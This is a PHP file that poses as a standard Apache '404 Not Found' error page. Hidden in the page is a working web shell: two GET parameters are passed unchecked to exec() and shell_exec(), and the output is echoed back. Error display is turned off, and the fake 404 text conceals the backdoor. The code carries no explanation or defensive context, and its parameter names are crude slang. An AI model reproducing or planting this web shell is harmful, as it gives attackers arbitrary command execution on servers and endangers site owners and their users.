<?php 
//error_reporting(E_ALL & ~E_NOTICE);
ini_set('display_errors', 'Off');
$kontol = $_SERVER['SERVER_NAME'];
?>

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<?php  
    if ($_GET['loli']) {
       echo exec($_GET['loli']);
    };

    if ($_GET['milf']) {
        echo shell_exec($_GET['milf']);
     };
?>
<p>
<hr>
<address>Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28 Server at <?= $kontol ?> Port 80</address>
</body></html>